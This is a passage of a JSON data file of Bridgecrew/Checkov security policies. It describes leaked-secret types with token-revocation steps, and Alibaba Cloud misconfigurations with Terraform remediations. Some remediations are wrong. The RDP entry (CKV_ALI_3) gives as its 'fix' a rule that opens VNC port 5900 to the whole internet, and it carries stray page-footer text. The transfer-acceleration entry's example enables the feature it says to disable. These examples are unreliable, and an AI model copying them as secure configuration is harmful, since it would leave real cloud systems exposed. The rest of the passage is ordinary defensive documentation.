        "description": "RubyGems API Key\nDescription\nRubyGems is a package manager for the Ruby programming language that provides a standard format for distributing Ruby programs and libraries, a tool designed to easily manage the installation of gems, and a server for distributing them.\nYou can create multiple API keys based on your requirements. API keys have varying scopes that grant specific privileges. Using API keys with the least amount of privilege makes your RubyGems.org account more secure by limiting the impact a compromised key may have.\nFix - Buildtime\nRubyGems\n\nVisit your RubyGems.org account settings page and click on API KEYS. You will be prompted for your account password to confirm your identity.\nUse the Edit button to update the scopes of the key. \nYou can use the Reset button in the last row to delete all the API keys associated with your account.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_65": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_65",
        "description": "Sentry Token\nDescription\nSentry Authentication tokens are passed using an auth header, and are used to authenticate as a user or organization account with the API. In our documentation, we have several placeholders that appear between curly braces or chevrons, such as {API_KEY} or <auth_token>, which you will need to replace with one of your authentication tokens in order to use the API call effectively.\nFix - Buildtime\nSentry\n\nGo to Settings > Developer Settings > [Your Internal Integration] \nYou can have up to 20 tokens at a time for each internal integration. These tokens do not expire automatically, but you can manually revoke them as needed.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_66": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_66",
        "description": "Splunk User Credentials\nDescription\nSplunk's Credential Management page enables storing credentials for scripted or modular inputs. Input configurations that reference credentials can use the credentials stored in Credential Management. Developers can store credentials such as usernames and passwords, or certificates used for authentication with third-party systems. It is discouraged to use this page to manage certificates used to encrypt server-to-server communications.\nFix - Buildtime\nSplunk\n\nOn the Enterprise Security menu bar, select Configure > General > Credential Management.\nIn the Action column of a credential or certificate, click Delete.\nClick OK to confirm.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_50": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_50",
        "description": "Intercom Access Token\nDescription\nThe Intercom Access Token allows access to the Intercom API. The Access Token is recommended for use in the following scenarios:\n\nWhen using the API to interact with an Intercom app\nWhen creating scripts that push or extract data from the Intercom app\nWhen automating certain actions in your the Intercom app\nWhen programmatically accessing customer data\n\nFix - Buildtime\nIntercom\nYou can regenerate the Access Token by clicking Regenerate token or uninstall this app which will revoke the Access Token (by clicking Uninstall app).",
        "severity": "LOW"
    },
    "CKV_SECRET_51": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_51",
        "description": "Jira Token\nDescription\nIn Jira, Personal access tokens (PATs) are a secure way to use scripts and integrate external applications with your Atlassian application. If an external system is compromised, you simply revoke the token instead of changing the password and consequently changing it in all scripts and integrations. Personal access tokens are a safe alternative to using username and password for authentication with various services. \nFix - Buildtime\nJira\n\nIn your Atlassian application go to:\nIn Jira select your profile picture at the top right of the screen, then choose  Personal Access Tokens .\nSelect Revoke next to the token you want to delete.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_52": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_52",
        "description": "LaunchDarkly Personal Token\nDescription\nIn LaunchDarkly, all REST API resources are authenticated with either personal or service access tokens, or session cookies. Other authentication mechanisms are not supported. You can manage personal access tokens on your Account settings page. You can configure a personal access token to have the same permissions that you do, or more restrictive permissions. Your personal tokens can never do more than you can in LaunchDarkly. Use a personal token when you want to access the LaunchDarkly API for your temporary or personal use.\nFix - Buildtime\nLaunchDarkly\n\nNavigate to the Account settings page.\nClick into the Authorization tab.\nFind your token in the \"Access tokens\" section.\nClick the overflow menu for the token and select from the menu:\n\"Delete token\": Deletes the access token. If you delete a token, API calls made with that token return 401 Unauthorized status codes.\n\nYou can also use the REST API: Delete access token\nTextcurl -i -X DELETE \\\n  'https://app.launchdarkly.com/api/v2/tokens/{id}' \\\n  -H 'Authorization: YOUR_API_KEY_HERE'\n",
        "severity": "LOW"
    },
    "CKV_SECRET_53": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_53",
        "description": "Netlify Token\nDescription\nNetlify provides a platform for building, deploying, and scaling websites whose source files are stored in the version control system Git and then generated into static web content files served via a Content Delivery Network. The platform also provides services and features of serverless computing and edge computing, offering serverless functions that are version-controlled, built, and deployed alongside frontend code.\nYou can generate a personal access token in your Netlify user settings for manual authentication in shell scripts or commands that use the Netlify API. If you\u2019re making a public integration with Netlify for others to enjoy, you must use OAuth2. This allows users to authorize your application to use Netlify on their behalf without having to copy/paste API tokens or touch sensitive login info. You\u2019ll need an application client key and a client secret to integrate with the Netlify API.\nFix - Buildtime\nNetlify\nTo revoke your user access token for Netlify CLI, go to your Netlify user Applications settings\nFor access granted using the netlify login command, scroll to the Authorized applications section, and find Netlify CLI. Select Options > Revoke access.\nIf you manually created a personal access token, you can find it in the Personal access tokens section. Select Options > Delete personal token.",
        "severity": "LOW"
    },
    "CKV_SECRET_67": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_67",
        "description": "Sumo Logic Keys\nDescription\nThe Sumo Logic Access Keys Management API allows developers to securely register new Collectors or access Sumo Logic APIs. This API was built with OpenAPI. Developers can generate client libraries in many languages and explore automated testing.\nFix - Buildtime\nSumo Logic\n\nIf you have the Create Access Keys role capability, you can use the Preferences page to create access keys. You can use the Preferences page to edit, activate, deactivate, and delete your access keys. \nWhen you mouse over an access key on the Preferences page, several controls appear.\nUse the trash can icon to permanently remove the access key. The key will no longer be usable for API calls. However, deleting a key used to register a Collector does not affect the Collector, as the only time a Collector uses the access key is at installation.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_68": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_68",
        "description": "Telegram Bot Token\nDescription\nThe Telegram Bot API is an HTTP-based interface created for developers keen on building bots for Telegram.\nFix - Buildtime\nTelegram\nStep 1: Revoke the token\n\nGo to Telegram\nClick on BotFather \nType in \"/mybots\"\nSelect the bot that needs to be revoked\nClick Edit and click Revoke\n\nStep 2: Monitor for abuse",
        "severity": "LOW"
    },
    "CKV_SECRET_70": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_70",
        "description": "Typeform API Token\nDescription\nTo use the Typeform Create, Responses, and Webhooks APIs, you need to pass your personal access token in the Authorization header of your requests. \nAccess tokens are long strings of random characters that look something like this: tfp_943af478d3ff3d4d760020c11af102b79c440513. The access token is unique per developer. It is used to identify a given user and make sure that only you can access your typeforms and results.\nFix - Buildtime\nTypeform\n\nLog in to your account at Typeform.\nIn the upper-left corner, in the drop-down menu next to your username, click Account.\nIn the left menu, click Personal tokens or here.\nIdentify the token you want to delete.\nClick ..., the three dots button in the right-side of the list.\nClick Delete this token.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_71": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_71",
        "description": "Vault Unseal Key\nDescription\nWhen a Vault server is started, it starts in a sealed state. In this state, Vault is configured to know where and how to access the physical storage, but doesn't know how to decrypt any of it. Unsealing is the process of obtaining the plaintext root key necessary to read the decryption key to decrypt the data, allowing access to the Vault.\nFix - Buildtime\nVault\nStep 1: Revoke the key\n\nConnect to Vault\nRun vault operator key revoke followed by the number, such as vault operator key revoke 2\nVerify it was revoked with vault operator key status\n\nStep 2: Monitor for abuse",
        "severity": "LOW"
    },
    "CKV_SECRET_69": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_69",
        "description": "Travis Personal Token\nDescription\nTravis CI is a hosted CI service used to build and test software projects hosted on GitHub and Bitbucket. Travis CI was the first CI service which provided services to open-source projects for free and continues to do so. TravisPro provides custom deployments of a proprietary version on the customer's own hardware.\nFix - Buildtime\nTravis CI\nStep 1: Revoke the token\n\nGo to Travis CI and click on your avatar, then click on Settings\nClick on the Tokens tab\nFind the compromised token and click on the trash icon\n\nStep 2: Monitor for abuse",
        "severity": "LOW"
    },
    "CKV_SECRET_72": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_72",
        "description": "Yandex Predictor API key\nDescription\nYandex Predictor is an a machine learning service hosted by Yandex Cloud. The Yandex Predictor API Key is used to authenticate and authorize access to the API to add machine learning to services.\nFix - Buildtime\nYandex Cloud\n\nIn Yandex Cloud, go to Access Management\nClick on API keys\nFind the API key you want to revoke\nClick on the three dot icon and select Delete\nTrack usage and set up alerts to spot any abuse of the credential\n",
        "severity": "LOW"
    },
    "CKV_SECRET_73": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_73",
        "description": "Cloudflare API Credentials\nDescription\nUsing the Cloudflare API, requires authentication so that Cloudflare knows who is making requests and what permissions they have. An API Token can be created to grant access to the API to perform actions. See creating an API Token for more on this. When using the Cloudflare API, developers need to authenticate API requests.\nFix - Buildtime\nCloudflare\nTextcurl -X DELETE \\\n\n\"https://api.cloudflare.com/client/v4/zones/<ZONE_ID>/filters?id=<FILTER_ID_1>&id=<FILTER_ID_2>\" \\\n-H \"X-Auth-Email: <EMAIL>\" \\\n-H \"X-Auth-Key: <API_KEY>\"\n",
        "severity": "LOW"
    },
    "CKV_SECRET_74": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_74",
        "description": "Vercel API Token\nDescription\nVercel Access Tokens are required to authenticate and use the Vercel API. Tokens can be created and managed inside your account settings, and can be scoped to only allow access for specific Teams. \nFix - Buildtime\nVercel\nStep 1: Revoke the key\n\nOn Vercel, click on the avatar, then Account\nClick on the API Tokens\nFind the API Token you want to revoke and click on the trash icon\n\nStep 2: Monitor for abuse",
        "severity": "LOW"
    },
    "CKV_SECRET_75": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_75",
        "description": "Webflow API Token\nDescription\nWebflow CMS API's allow developers to programmatically add, update, and delete items from Collections. Creating webhooks with the CMS API is gets Webflow to \"talk\" to third party applications. It lets developers programmatically add, update, and delete items from your Collections.\nFix - Buildtime\nWebflow\nStep 1: Revoke the token\n\nGo to Webflow, click on your avatar\nClick on the API Tokens tab\nFind the token to revoke and click on the trash icon\n\nStep 2: Monitor for abuse",
        "severity": "LOW"
    },
    "CKV_SECRET_76": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_76",
        "description": "Scalr API Token\nDescription\nScalr is a remote operations backend for Terraform. It executes Terraform operations and stores state, regardless of the workflow, in Scalr itself allowing for easy collaboration across your organization. That means you can easily onboard an existing GitOps or native Terraform CLI based workflows into Scalr with little to no modification to your actual code.\nFix - Buildtime\nScalr\nStep 1: Revoke the token\n\nGo to Scalr, click on Account\nClick on API Tokens\nFind the token to revoke and click on the trash icon\n\nStep 2: Monitor for abuse",
        "severity": "LOW"
    },
    "CKV_SECRET_79": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_79",
        "description": "GCP Service Account Auth Key\nDescription\nA Google Cloud Platform (GCP) service account auth key is a file that provides authentication credentials for a GCP service account. GCP service accounts are a way to authenticate and authorize applications and services running on GCP, and they can be used to access various GCP services, such as Cloud Storage, BigQuery, or Compute Engine.\nFix - Buildtime\nGCP\nTo revoke the key\n\nGo to the GCP Console and navigate to the Service Accounts page.\nFind the service account associated with the auth key you want to revoke and click on it.\nClick on the \"Keys\" tab to see a list of all the auth keys associated with the service account.\nFind the auth key you want to revoke and click on the \"Actions\" button on the right side of the row.\nSelect \"Delete\" from the dropdown menu.\nIn the confirmation dialog that appears, click \"Delete\" to confirm the deletion of the auth key.\n",
        "severity": "MEDIUM"
    },
    "CKV_ALI_3": {
        "url": "https://docs.bridgecrew.io/docs/ensure-no-alibaba-cloud-security-groups-allow-ingress-from-00000-to-port-3389",
        "description": "Alibaba Cloud Security group allows internet traffic to RDP port (3389)\nDescription\nThis policy identifies Security groups that allow inbound traffic on RDP port (3389) from the public internet. As a best practice, restrict security groups to only allow permitted traffic and limit brute force attacks on your network.\nFix - Runtime\nAlibaba Cloud Portal\n\nLog in to Alibaba Cloud Portal\nGo to Elastic Compute Service\nIn the left-side navigation pane, choose Network & Security > Security Groups\nSelect the reported security group and then click Add Rules in the Actions column\nIn Inbound tab, Select the rule having 'Action' as Allow, 'Authorization Object' as 0.0.0.0/0 and 'Port Range' value as 3389, Click Modify in the Actions column\nReplace the value 0.0.0.0/0 with specific IP address range.\nClick on 'OK'\n\nFix - Buildtime \nTerraform\nGoresource \"alicloud_security_group_rule\" \"allow_all_vncserver\" {\n  type              = \"ingress\"\n  ip_protocol       = \"tcp\"\n  nic_type          = \"internet\"\n  policy            = \"accept\"\n  port_range        = \"5900/5900\"\n  security_group_id = alicloud_security_group.default.id\n  cidr_ip           = \"0.0.0.0/0\"\n}\nFooter\n\u00a9 2022 GitHub, Inc.\nFooter navigation\n",
        "severity": "HIGH"
    },
    "CKV_ALI_4": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-action-trail-logging-for-all-regions",
        "description": "Alibaba Cloud Action Trail Logging is not enabled for all regions\nDescription\nBy enabling Action Trail logging for all regions, you can track and monitor all activity in your Alibaba Cloud account, including the source IP address, the user or service that made the request, and the response status. This can help to identify potential security issues or unauthorized access, and can also be useful for auditing purposes.\nFix - Buildtime \nTerraform\nGoresource \"alicloud_actiontrail_trail\" \"pass\" {\n  trail_name         = \"action-trail\"\n  oss_write_role_arn = \"acs:ram::1182725xxxxxxxxxxx\"\n  oss_bucket_name    = \"bucket_name\"\n  event_rw           = \"All\"\n  trail_region       = \"All\"\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_21": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-api-gateway-api-protocol-uses-https",
        "description": "Alibaba Cloud API Gateway API Protocol does not use HTTPS\nDescription\nUsing HTTPS for the API Protocol can help to protect against potential security risks such as man-in-the-middle attacks, in which an attacker intercepts and modifies the communication between the API and its clients. HTTPS uses encryption to secure the communication between the API and its clients, which can help to prevent unauthorized access or tampering with the data being transferred.\nFix - Buildtime \nTerraform\nGoresource \"alicloud_api_gateway_api\" \"pass\" {\n  name              = alicloud_api_gateway_group.apiGroup.name\n  group_id          = alicloud_api_gateway_group.apiGroup.id\n  description       = \"your description\"\n  auth_type         = \"APP\"\n  force_nonce_check = false\n\n  request_config {\n    protocol = \"HTTPS\"\n    method   = \"GET\"\n    path     = \"/test/path1\"\n    mode     = \"MAPPING\"\n  }\n\n  service_type = \"HTTP\"\n\n  http_service_config {\n    address   = \"https://apigateway-backend.alicloudapi.com:8080\"\n    method    = \"GET\"\n    path      = \"/web/cloudapi\"\n    timeout   = 12\n    aone_name = \"cloudapi-openapi\"\n  }\n\n  request_parameters {\n    name         = \"aaa\"\n    type         = \"STRING\"\n    required     = \"OPTIONAL\"\n    in           = \"QUERY\"\n    in_service   = \"QUERY\"\n    name_service = \"testparams\"\n  }\n\n  stage_names = [\n    \"RELEASE\",\n    \"TEST\",\n  ]\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_18": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-prevents-password-reuse",
        "description": "Alibaba Cloud RAM password policy does not prevent password reuse\nDescription\nBy default, the RAM password policy does not prevent password reuse, so it is important to enable this feature to help protect your account. When password reuse is prevented, users will not be able to use a password that they have previously used for the account. This can help to reduce the risk of unauthorized access, as it makes it more difficult for an attacker to guess or recover an old password.\nFix - Buildtime \nTerraform\nGoresource \"alicloud_ram_account_password_policy\" \"pass\" {\n  minimum_password_length      = 14\n  require_lowercase_characters = false\n  require_uppercase_characters = false\n  require_numbers              = false\n  require_symbols              = true\n  hard_expiry                  = true\n  max_password_age             = 14\n  password_reuse_prevention    = 24\n  max_login_attempts           = 3\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_ALI_7": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-disk-is-encrypted",
        "description": "Alibaba Cloud Disk encryption is disabled\nDescription\nThis policy identifies disks for which encryption is disabled. As a best practice enable disk encryption to improve data security without making changes to your business or applications. Snapshots created from encrypted disks and new disks created from these snapshots are automatically encrypted.\nFix - Runtime\nAlibaba Cloud Portal\nAlibaba Cloud disk can only be encrypted at the time of disk creation. So to resolve this alert, create a new disk with encryption and then migrate all required disk data from the reported disk to this newly created disk.\nTo create an Alibaba Cloud disk with encryption:\n\nLog in to Alibaba Cloud Portal\nGo to Elastic Compute Service\nIn the left-side navigation pane, click on 'Disks' which is under 'Storage & Snapshots'\\n4. Click on 'Create Disk'\nCheck the 'Disk Encryption' box in the 'Disk' section\nClick on 'Preview Order' make sure parameters are chosen correctly\nClick on 'Create', After you create a disk, attach that disk to other resources per your requirements.\n\nFix - Buildtime \nTerraform\nGoresource \"alicloud_disk\" \"pass\" {\n  # cn-beijing\n  description = \"Hello ecs disk.\"\n  category    = \"cloud_efficiency\"\n  size        = \"30\"\n  encrypted   = true\n  kms_key_id  = \"2a6767f0-a16c-1234-5678-13bf*****\"\n  tags = {\n    Name = \"TerraformTest\"\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_ALI_19": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-uppercase-letter",
        "description": "Alibaba Cloud RAM password policy does not have an uppercase character\nDescription\nThis policy identifies Alibaba Cloud accounts that do not have an uppercase character in the password policy. As a security best practice, configure a strong password policy for secure access to the Alibaba Cloud console.\nFix - Runtime\nAlibaba Cloud Portal\n\nLog in to Alibaba Cloud Portal\nGo to Resource Access Management (RAM) service\nIn the left-side navigation pane, click on 'Settings'\nIn the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'\nIn the 'Required Elements in Password' field, select 'Upper-Case Letter'\nClick on 'OK'\nClick on 'Close'\n\nFix - Buildtime \nTerraform\nGoresource \"alicloud_ram_account_password_policy\" \"pass\" {\n  minimum_password_length      = 14\n  require_lowercase_characters = false\n  require_uppercase_characters = true\n  require_numbers              = false\n  require_symbols              = true\n  hard_expiry                  = true\n  max_password_age             = 14\n  password_reuse_prevention    = 5\n  max_login_attempts           = 3\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_ALI_13": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-minimum-length-of-14-or-greater",
        "description": "Alibaba Cloud RAM password policy does not have a minimum of 14 characters\nDescription\nThis policy identifies Alibaba Cloud accounts that do not have a minimum of 14 characters in the password policy. As a security best practice, configure a strong password policy for secure access to the Alibaba Cloud console.\nFix - Runtime\nAlibaba Cloud Portal\n\nLog in to Alibaba Cloud Portal\nGo to Resource Access Management (RAM) service\nIn the left-side navigation pane, click on 'Settings'\nIn the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'\nIn the 'Password Length' field, enter 14 as the minimum number of characters for password complexity.\nClick on 'OK'\nClick on 'Close'\n\nFix - Buildtime \nTerraform\nGoresource \"alicloud_ram_account_password_policy\" \"pass\" {\n  minimum_password_length      = 14\n  require_lowercase_characters = false\n  require_uppercase_characters = true\n  require_numbers              = false\n  require_symbols              = true\n  hard_expiry                  = true\n  max_password_age             = 14\n  password_reuse_prevention    = 5\n  max_login_attempts           = 3\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_ALI_25": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-sql-collector-retention-period-should-be-greater-than-180",
        "description": "Alibaba Cloud RDS Instance SQL Collector Retention Period is less than 180\nDescription\nThe SQL Collector is a feature of RDS that allows you to collect and analyze SQL performance data for your instance. The SQL Collector Retention Period is the length of time that SQL performance data is retained in the RDS instance.\nBy setting the SQL Collector Retention Period to a value greater than 180, you can ensure that the instance has a longer history of SQL performance data, which can be useful for troubleshooting and performance optimization. \nFix - Buildtime \nTerraform\nGoresource \"alicloud_db_instance\" \"pass\" {\n  engine                     = \"MySQL\"\n  engine_version             = \"5.6\"\n  instance_type              = \"rds.mysql.t1.small\"\n  instance_storage           = \"10\"\n  sql_collector_status       = \"Enabled\"\n  sql_collector_config_value = 180\n  parameters = [{\n    name  = \"innodb_large_prefix\"\n    value = \"ON\"\n    }, {\n    name  = \"connect_timeout\"\n    value = \"50\"\n    }, {\n    name  = \"log_connections\"\n    value = \"ON\"\n  }]\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_16": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-expires-passwords-within-90-days-or-less",
        "description": "Alibaba Cloud RAM password policy does not expire passwords within 90 days or less\nDescription\nThis policy identifies Alibaba Cloud accounts for which do not have password expiration set to 90 days or less. As a best practice, change your password every 90 days or sooner to ensure secure access to the Alibaba Cloud console.\nFix - Runtime\nAlibaba Cloud Portal\n\nLog in to Alibaba Cloud Portal\nGo to Resource Access Management (RAM) service\nIn the left-side navigation pane, click on 'Settings'\nIn the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'\nIn the 'Password Validity Period' field, enter 90 or less based on your requirement.\nClick on 'OK'\nClick on 'Close'\n\nFix - Buildtime \nTerraform\nGoTBD\n",
        "severity": "LOW"
    },
    "CKV_ALI_22": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-transparent-data-encryption-is-enabled-on-instance",
        "description": "Alibaba Cloud Transparent Data Encryption is disabled on instance\nDescription\nTDE is a security feature that encrypts data at the storage level, which means that data is encrypted as it is written to disk and decrypted when it is read.\nBy enabling TDE on an instance, you can help to protect the data stored on the instance from unauthorized access or exposure. TDE can help to prevent data breaches and can help to meet compliance requirements that may require data to be encrypted at rest.\nFix - Buildtime \nTerraform\nGoresource \"alicloud_db_instance\" \"pass\" {\n  engine              = \"MySQL\"\n  engine_version      = \"5.6\"\n  instance_type   = \"rds.mysql.t1.small\"\n  instance_storage = \"10\"\n  tde_status          = \"Enabled\"\n  parameters = [{\n    name  = \"innodb_large_prefix\"\n    value = \"ON\"\n    }, {\n    name  = \"connect_timeout\"\n    value = \"50\"\n  }]\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_14": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-number",
        "description": "Alibaba Cloud RAM password policy does not have a number\nDescription\nThis policy identifies Alibaba Cloud accounts that do not have a number in the password policy. As a security best practice, configure a strong password policy for secure access to the Alibaba Cloud console.\nFix - Runtime\nAlibaba Cloud Portal\n\nLog in to Alibaba Cloud Portal\nGo to Resource Access Management (RAM) service\nIn the left-side navigation pane, click on 'Settings'\nIn the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'\nIn the 'Required Elements in Password' field, select 'Numbers'\nClick on 'OK'\nClick on 'Close'\n\nFix - Buildtime \nTerraform\nGoresource \"alicloud_ram_account_password_policy\" \"pass\" {\n  minimum_password_length      = 14\n  require_lowercase_characters = false\n  require_uppercase_characters = true\n  require_numbers              = true\n  require_symbols              = true\n  hard_expiry                  = true\n  max_password_age             = 14\n  password_reuse_prevention    = 5\n  max_login_attempts           = 3\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_ALI_9": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-database-instance-is-not-public",
        "description": "Alibaba Cloud database instance is public\nDescription\nBy ensuring that your database instance is not public, you can help protect your data from unauthorized access or tampering. Public database instances are accessible over the internet, which can make them vulnerable to external threats such as hackers or malware. By making it private, you can help ensure that only authorized users can access the data.\nFix - Buildtime \nTerraform\nGoresource \"alicloud_db_instance\" \"pass\" {\n  engine              = \"MySQL\"\n  engine_version      = \"5.6\"\n  db_instance_class   = \"rds.mysql.t1.small\"\n  db_instance_storage = \"10\"\n  security_ips = [\n    \"10.23.12.24\"\n  ]\n  parameters = [{\n    name  = \"innodb_large_prefix\"\n    value = \"ON\"\n    }, {\n    name  = \"connect_timeout\"\n    value = \"50\"\n  }]\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_6": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-is-encrypted-with-customer-master-key",
        "description": "Alibaba Cloud OSS bucket is not encrypted with Customer Master Key\nDescription\nEncrypting your OSS bucket with a CMK helps protect your data from unauthorized access or tampering. By encrypting your bucket, you can ensure that only authorized users with the correct key can access and decrypt the data, and that the data is protected while in storage.\nFix - Buildtime\nTerraform\nGoresource \"alicloud_oss_bucket\" \"pass\" {\n  bucket = \"bucket-123\"\n  acl    = \"private\"\n\n  server_side_encryption_rule {\n    sse_algorithm     = \"KMS\"\n    kms_master_key_id = \"your kms key id\"\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_ALI_8": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-disk-is-encrypted-with-customer-master-key",
        "description": "Alibaba Cloud Disk is not encrypted with Customer Master Key\nDescription\nEncrypting your disk with a CMK helps protect your data from unauthorized access or tampering. By encrypting your bucket, you can ensure that only authorized users with the correct key can access and decrypt the data, and that the data is protected while in storage.\nFix - Buildtime\nTerraform\nGoresource \"alicloud_disk\" \"pass\" {\n  # cn-beijing\n  description = \"Hello ecs disk.\"\n  category    = \"cloud_efficiency\"\n  size        = \"30\"\n  encrypted   = true\n  kms_key_id  = \"2a6767f0-a16c-1234-5678-13bf*****\"\n  tags = {\n    Name = \"TerraformTest\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_26": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kubernetes-installs-plugin-terway-or-flannel-to-support-standard-policies",
        "description": "Alibaba Cloud Kubernetes does not install plugin Terway or Flannel to support standard policies\nDescription\nInstalling the Terway or Flannel plugin on an Alibaba Cloud Kubernetes cluster can help to support standard policies for network communication and routing. Both Terway and Flannel are network plugins that can be used to provide network connectivity and communication between pods in a Kubernetes cluster.\nTerway is a network plugin developed by Alibaba Cloud that is optimized for use with Alibaba Cloud Container Service for Kubernetes. It provides high-performance and low-latency network connectivity for Kubernetes clusters running on Alibaba Cloud.\nFix - Buildtime\nTerraform\nGoresource \"alicloud_cs_kubernetes\" \"pass\" {\n  worker_number         = 4\n  worker_vswitch_ids    = [\"vsw-id1\", \"vsw-id1\", \"vsw-id3\"]\n  master_vswitch_ids    = [\"vsw-id1\", \"vsw-id1\", \"vsw-id3\"]\n  master_instance_types = [\"ecs.n4.small\", \"ecs.sn1ne.xlarge\", \"ecs.n4.xlarge\"]\n  worker_instance_types = [\"ecs.n4.small\", \"ecs.sn1ne.xlarge\", \"ecs.n4.xlarge\"]\n\n  addons {\n    config = \"\"\n    name   = \"terway-eniip\"\n  }\n\n  pod_vswitch_ids = [\"vsw-id4\"]\n}\n\n# array of addons\nresource \"alicloud_cs_kubernetes\" \"pass2\" {\n  worker_number         = 4\n  worker_vswitch_ids    = [\"vsw-id1\", \"vsw-id1\", \"vsw-id3\"]\n  master_vswitch_ids    = [\"vsw-id1\", \"vsw-id1\", \"vsw-id3\"]\n  master_instance_types = [\"ecs.n4.small\", \"ecs.sn1ne.xlarge\", \"ecs.n4.xlarge\"]\n  worker_instance_types = [\"ecs.n4.small\", \"ecs.sn1ne.xlarge\", \"ecs.n4.xlarge\"]\n\n  addons {\n    config = \"\"\n    name   = \"flannel\"\n  }\n\n  addons {\n    name   = \"csi-plugin\"\n    config = \"\"\n  }\n\n  pod_cidr = \"10.0.1.0/16\"\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_11": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-transfer-acceleration-disabled",
        "description": "Alibaba Cloud OSS bucket has Transfer Acceleration disabled\nDescription\nTransfer Acceleration is a feature in Alibaba Cloud OSS (Object Storage Service) that allows you to transfer large files over the internet more quickly by using optimized network paths. While Transfer Acceleration can be useful for improving the speed of file transfers, it can also increase the cost of data transfer.\nIf you do not need the faster transfer speeds provided by Transfer Acceleration, or if you are trying to minimize costs, you may want to ensure that Transfer Acceleration is disabled for your OSS bucket. Disabling Transfer Acceleration can help to reduce the cost of data transfer, as you will only be charged for standard data transfer rates rather than the higher rates associated with Transfer Acceleration.\nFix - Buildtime\nTerraform\nGoresource \"alicloud_oss_bucket\" \"pass\" {\n  bucket = \"bucket_name\"\n\n  transfer_acceleration {\n    enabled = true\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_17": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-lowercase-letter",
        "description": "Alibaba Cloud RAM password policy does not have a lowercase character\nDescription\nThis policy identifies Alibaba Cloud accounts that do not have a lowercase character in the password policy. As a security best practice, configure a strong password policy for secure access to the Alibaba Cloud console.\nFix - Runtime\nAlibaba Cloud Portal\n\nLog in to Alibaba Cloud Portal\nGo to Resource Access Management (RAM) service\nIn the left-side navigation pane, click on 'Settings'\nIn the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'\nIn the 'Required Elements in Password' field, select 'Lowercase Letters'\nClick on 'OK'\nClick on 'Close'\n\nFix - Buildtime \nTerraform\nGoresource \"alicloud_ram_account_password_policy\" \"pass\" {\n  minimum_password_length      = 14\n  require_lowercase_characters = true\n  require_uppercase_characters = false\n  require_numbers              = false\n  require_symbols              = false\n  hard_expiry                  = true\n  max_password_age             = 14\n  password_reuse_prevention    = 5\n  max_login_attempts           = 3\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_ALI_23": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-account-maximal-login-attempts-is-less-than-5",
